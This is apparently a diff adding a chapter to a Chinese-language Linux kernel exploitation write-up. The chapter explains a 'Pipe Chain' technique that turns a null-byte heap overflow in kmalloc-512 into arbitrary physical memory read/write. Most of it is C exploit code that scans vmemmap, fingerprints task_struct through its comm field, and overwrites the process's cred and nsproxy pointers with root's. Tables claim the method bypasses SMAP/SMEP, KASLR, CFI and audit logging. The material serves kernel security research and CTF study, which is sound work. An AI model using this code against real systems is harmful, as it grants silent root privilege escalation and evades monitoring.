+Phase 4的`discover_vmemmap_base()`逆向搜索内核`vmemmap`区域：
+
+```c
+void discover_vmemmap_base(void){
+    // 从对齐后的page指针推导初始vmemmap区域
+    vmemmap_base = (size_t)primary_fake_pipe_buf.page & 0xfffffffff0000000;
+    size_t round = 0;
+
+    for (round = 0; ; round++) {
+        size_t candidate_value[4] = {0};
+        // 读取候选vmemmap条目
+        arbitrary_physical_read((vmemmap_base + 0x2740), 0, candidate_value, 0x10);
+
+        // 验证候选：匹配secondary_startup_64特征
+        if (candidate_value[0] > kernel_base &&
+            ((candidate_value[0] & 0xfff) == (SECONDARY_STARTUP_64 & 0xfff))) {
+            log.success("[Round %lu] Located secondary_startup_64 signature in physmem, addr=0x%lx",
+                       round, candidate_value[0]);
+            break;
+        }
+        vmemmap_base -= 0x10000000;  // 向后步进256MB
+    }
+    log.success("[Round %lu] Successfully mapped vmemmap_base address: 0x%lx", round, vmemmap_base);
+}
+```
+
+**vmemmap扫描策略**：
+
+1. **起始点推算**：从对齐后的`page`指针（物理页帧号）推导`vmemmap`区域基址。`vmemmap`是内核用于管理物理页帧的虚拟地址区域，每个物理页对应一个`struct page`。
+
+2. **特征匹配**：通过物理读原语扫描候选地址，寻找`secondary_startup_64`函数的特征。该函数是内核启动代码，具有固定的虚拟地址布局，其低12位在KASLR下保持不变。
+
+3. **反向步进**：以256MB为步长向后扫描，适应不同内核版本和配置的`vmemmap`布局差异。这种**梯度下降**策略提高兼容性。
+
+**vmemmap映射关系**：
+
+```mermaid
+graph LR
+    A[物理页帧号 PFN] --> B[vmemmap虚拟地址区域];
+    B --> C[struct page数组];
+    C --> D[每个物理页对应一个struct page];
+
+    E[已知: primary_fake_pipe_buf.page] --> F[物理页帧号];
+    F --> G[计算vmemmap偏移];
+    G --> H[推导vmemmap_base];
+
+    style B fill:#e8f4fd,stroke:#1976d2;
+    style H fill:#ffe0b2,stroke:#f57c00;
+```
+
+#### 7-6-2. task_struct 的多锚点指纹识别
+
+`locate_task_structures()` 逐页扫描物理内存，通过多字段交叉验证精准锁定关键内核对象：
+
+```c
+void locate_task_structures(void) {
+    size_t round = 0;
+    int current_task_found = 0, root_task_found = 0;
+    char page_content_buffer[0x1000] = {0};
+    size_t *current_comm_ptr, *root_comm_ptr;
+
+    // 植入当前进程唯一标识
+    prctl(PR_SET_NAME, "pwn4kernel");
+
+    for (round = 0; ; round++) {
+        memset(page_content_buffer, 0, 0x1000);
+        // 按页扫描 vmemmap 区域
+        arbitrary_physical_read((vmemmap_base + round * 0x40), 0, page_content_buffer, 0xf00);
+
+        current_comm_ptr = (size_t*)memmem(page_content_buffer, 0xf00, "pwn4kernel", 10);
+        root_comm_ptr    = (size_t*)memmem(page_content_buffer, 0xf00, "swapper", 7);
+
+        // 当前进程 task_struct 四指针联合校验
+        if (current_comm_ptr && (current_comm_ptr[-1] > 0xffff888000000000) &&  // cred
+            (current_comm_ptr[-2] > 0xffff888000000000) &&                      // real_cred
+            (current_comm_ptr[-55] > 0xffff888000000000) &&                     // real_parent
+            (current_comm_ptr[-54] > 0xffff888000000000)) {                     // parent
+
+            current_task_found++;
+            parent_task_addr = current_comm_ptr[-55];
+            // 从 ptraced 反推 task_struct 基址（偏移 0x328）
+            current_task_addr = current_comm_ptr[-48] - 0x328;
+            // 计算 page_offset_base：对齐到页边界后再降维到 256MB 粒度
+            page_offset_base = (current_comm_ptr[-48] & ~0xFFF) - round * 0x1000;
+            page_offset_base &= 0xfffffffff0000000;
+
+            current_task_page_addr = vmemmap_base + round * 0x40;
+            log.success("[Round %lu] Current task_struct → phys page: 0x%lx", round, current_task_page_addr);
+            log.success("[Round %lu] page_offset_base resolved: 0x%lx", round, page_offset_base);
+            if (current_task_found && root_task_found) break;
+        }
+
+        // init 进程（swapper）同结构校验
+        if (root_comm_ptr && (root_comm_ptr[-1] > 0xffff888000000000) &&
+            (root_comm_ptr[-2] > 0xffff888000000000) &&
+            (root_comm_ptr[-55] > 0xffff888000000000) &&
+            (root_comm_ptr[-54] > 0xffff888000000000)) {
+
+            root_task_found++;
+            root_cred_addr    = root_comm_ptr[-2];
+            root_task_addr    = root_comm_ptr[-48] - 0x328;
+            root_nsproxy_addr = root_comm_ptr[6];  // nsproxy 在 comm 后方 +6 字长
+            root_task_page_addr = vmemmap_base + round * 0x40;
+            log.success("[Round %lu] Root swapper task_struct → phys page: 0x%lx", round, root_task_page_addr);
+            log.success("[Round %lu] Root cred virt addr: 0x%lx", round, root_cred_addr);
+            if (current_task_found && root_task_found) break;
+        }
+    }
+}
+```
+
+**多锚点验证逻辑**：
+
+1. **双字符串锚点**：用 `prctl(PR_SET_NAME)` 写入独特 `comm` 字段作为当前进程指纹；同时搜索 init 进程固定名 `"swapper"` 作根锚点。
+2. **指针偏移交叉锁**：以 `comm`（`task_struct+0x4a8`）为基准，校验周边关键指针的固定偏移是否落在 KASLR 合法区间（`>0xffff888000000000`）：
+    - `cred`（`-1`，偏移 `0x4a0`）、`real_cred`（`-2`，偏移 `0x498`）
+    - `real_parent`（`-55`，偏移 `0x2f0`）、`parent`（`-54`，偏移 `0x2f8`）
+    - `ptraced`（`-48`，偏移 `0x328`）、`nsproxy`（`+6`，偏移 `0x4d8`）
+3. **基址反推与降维**：通过 `ptraced` 字段反推 `task_struct` 基址，并将页内偏移抹平后按 256MB 对齐，得到稳定的 `page_offset_base`。
+
+**定位后全局状态**：
+
+- `current_task_page_addr`：当前进程 `task_struct` 所在物理页（后续原位修改靶标）
+- `root_cred_addr` / `root_nsproxy_addr`：根进程凭证与命名空间代理虚拟地址（指针替换源）
+- `page_offset_base`：物理页帧到内核虚拟地址的映射基址（补全内存坐标系）
+
+```mermaid
+flowchart TD
+    A[逐页物理扫描] --> B{页内含目标 comm?};
+    B -->|pwn4kernel| C[当前进程候选];
+    B -->|swapper| D[根进程候选];
+    C --> E[校验 cred/parent/ptraced 等指针];
+    D --> F[同结构指针校验];
+    E -->|通过| G[记录物理页与虚拟地址];
+    F -->|通过| H[记录 root cred/nsproxy 地址];
+    G --> I[双锚点均找到则退出];
+    H --> I;
+```
+
+### 7-7. 物理层执行上下文重构
+
+Phase 5 的 `escalate_privileges()` 在物理页帧层面完成内核对象的原位改写，实现权限上下文切换：
+
+```c
+void escalate_privileges(void) {
+    size_t round = 0;
+    char task_copy_buffer[0x1000] = {0};
+    size_t *current_comm_field_ptr;
+
+    for (round = 0; ; round++) {
+        memset(task_copy_buffer, 0, 0x1000);
+        // 读取承载 task_struct 的完整物理页
+        arbitrary_physical_read((current_task_page_addr + round * 0x40), 0, task_copy_buffer, 0xf00);
+
+        current_comm_field_ptr = (size_t*)memmem(task_copy_buffer, 0xf00, "pwn4kernel", 10);
+
+        // 二次校验结构完整性后执行指针替换
+        if (current_comm_field_ptr && (current_comm_field_ptr[-1] > 0xffff888000000000) &&
+            (current_comm_field_ptr[-2] > 0xffff888000000000) &&
+            (current_comm_field_ptr[-55] > 0xffff888000000000) &&
+            (current_comm_field_ptr[-54] > 0xffff888000000000)) {
+
+            // 物理层指针改写：嫁接根进程权限与命名空间
+            current_comm_field_ptr[-1] = root_cred_addr;     // task->cred = root_cred
+            current_comm_field_ptr[-2] = root_cred_addr;     // task->real_cred = root_cred
+            current_comm_field_ptr[6]  = root_nsproxy_addr;  // task->nsproxy = root_nsproxy
+
+            // 整页写回物理内存
+            arbitrary_physical_write((current_task_page_addr + round * 0x40), 0, task_copy_buffer, 0xf00);
+
+            log.success("[Round %d] Credential patching complete at phys page: 0x%lx", round, current_task_page_addr);
+            break;
+        }
+    }
+}
+```
+
+**物理层重构的底层机制**：
+
+1. **原位内存手术**：直接读取承载 `task_struct` 的物理页到用户缓冲区，修改关键指针后整页写回。全程无内核函数调用，纯物理地址空间操作。
+2. **权限体系嫁接**：将当前进程 `cred`/`real_cred` 替换为 root 凭证地址，继承完整权能；`nsproxy` 替换接入 root 命名空间视图（mount/UTS/IPC/PID），实现权限域无缝切换。
+3. **即时生效**：物理修改立即可见于所有虚拟映射。当前进程上下文、调度器状态、系统调用路径同步更新，无需进程切换或通知，“写时生效”。
+
+```mermaid
+flowchart TD
+    A[物理内存操作] --> B[读取 task_struct 物理页];
+    B --> C[本地替换 cred/nsproxy 指针];
+    C --> D[整页写回物理内存];
+    D --> E[所有虚拟映射即时同步];
+
+    E --> F[当前进程上下文];
+    E --> G[内核调度器状态];
+    E --> H[系统调用路径];
+
+    F --> I[继承 root 权能与命名空间];
+    G --> J[调度识别为特权实体];
+    H --> K[系统调用通过所有检查];
+
+    style A fill:#ffcdd2,stroke:#d32f2f,stroke-width:2px;
+    style I fill:#c8e6c9,stroke:#388e3c,stroke-width:2px;
+```
+
+**无代码执行的范式特征**：
+
+- **脱离控制流**：无指令执行、跳转或调用，规避 CFI/shadow stack 等代码防护。
+- **零异常触发**：不引发缺页、权限错误、审计事件或日志，隐蔽性达物理级。
+- **无竞争风险**：物理写入具原子性，无 TOCTOU 竞态，可靠性高于虚拟层篡改。
+
+**防御体系的物理层穿透**：
+
+| 防御层      | 传统虚拟层绕行 | Pipe Chain 物理层穿透        |
+| ----------- | -------------- | ---------------------------- |
+| SMAP/SMEP   | 需代码绕行     | **完全失效（无用户态指针）** |
+| KASLR       | 需指针泄露推算 | **物理扫描直接定位**         |
+| 堆隔离/沙盒 | 受限对象操作   | **物理跨域访问**             |
+| 权限检查    | 需篡改检查逻辑 | **前置检查全部跳过**         |
+| 审计监控    | 触发系统事件   | **无事件产生**               |
+| 代码签名/CI | 依赖合法代码块 | **无代码执行**               |
+
+### 7-8. 技术演进对比与范式意义
+
+#### 7-8-1. 技术路线对比
+
+| 维度           | 第六章（虚拟层路径）          | 本章（物理层 Pipe Chain） |
+| -------------- | ----------------------------- | ------------------------- |
+| **溢出输入**   | 单 Null 字节溢出              | 同左，起点一致            |
+| **泄露方式**   | 共享页泄露虚拟指针            | 物理链扫描直接定位        |
+| **操作层级**   | 虚拟地址对象操作              | **物理页帧直接读写**      |
+| **核心机制**   | 对象生命周期抢占 + 控制流导向 | 三节点几何闭环 + 原位改写 |
+| **SMAP/SMEP**  | 需代码绕行                    | 天然免疫                  |
+| **控制流防护** | 面临 CFI/KRETPOLINE 拦截      | **无控制流操作**          |
+| **隐蔽性**     | 可能产生异常日志              | 静默物理生效无痕          |
+| **稳定性**     | 依赖堆时序                    | 几何确定性高              |
+
+#### 7-8-2. 架构本质差异
+
+```mermaid
+mindmap
+  root(物理层操控范式)
+    (控制流独立性)
+      --> 无指令执行
+      --> 无跳转/调用
+      --> 绕过所有代码防护
+    (地址空间穿透)
+      --> 虚址校验全绕
+      --> 权限检查失效
+      --> 隔离边界突破
+    (操作原子性)
+      --> 无竞态条件
+      --> 无状态残留
+      --> 确定性生效
+    (系统视角隐匿)
+      --> 表现为普通 IO
+      --> 无异常事件
+      --> 审计不可见
+```
+
+---
+
+### 7-9. 技术总结：从字节到物理的拓扑演绎
+
+Pipe Chain 方案依循严密递进的拓扑编排链路，将单 Null 字节溢出升华为物理内存全局操控能力：首先通过管道喷洒与交替释放锁定 `kmalloc-512` 邻接布局，双分区标记奠定双阶段检测基石；单字节改写相邻 `pipe_buffer->page` 造就不对称物理页共享，释放受害管道诱发 `kmalloc-192` 堆喷抢占，悬空引用转为一级控制；页指针对齐主动制造二次重叠后，`kmalloc-512` 堆喷确立三节点同页布局，构建互控闭环实现物理 I/O 路由；动态重定向链节点 `page/offset` 形成任意物理读写原语，穿透虚拟层后经 `vmemmap` 梯度扫描与 `task_struct` 多锚校验精确定位对象，最终在物理页帧原位替换指针完成权限上下文无码重构。全链以几何确定性取代概率博弈，以物理操作消解代码防护，证明微扰动在不同编排下可呈指数级差异——虚拟层止于指针泄露与控制流导向，物理层则达全域内存编排，共同揭示内存安全不仅需虚拟壁垒，更需物理层一致防护。
+
+### 7-10. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/CrossCacheOverflow/CrossCacheOverflow_003.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 - https://github.com/BinRacer/pwn4kernel/tree/master/src/CrossCacheOverflow2
 - https://github.com/BinRacer/pwn4kernel/tree/master/src/CrossCacheOverflow3
+- https://github.com/BinRacer/pwn4kernel/tree/master/src/CrossCacheOverflow4
 - https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html
 - https://bsauce.github.io/2022/11/07/castaways/
+- https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE
 - https://github.com/arttnba3/Linux-kernel-exploitation/blob/main/tools/kernelpwn.h
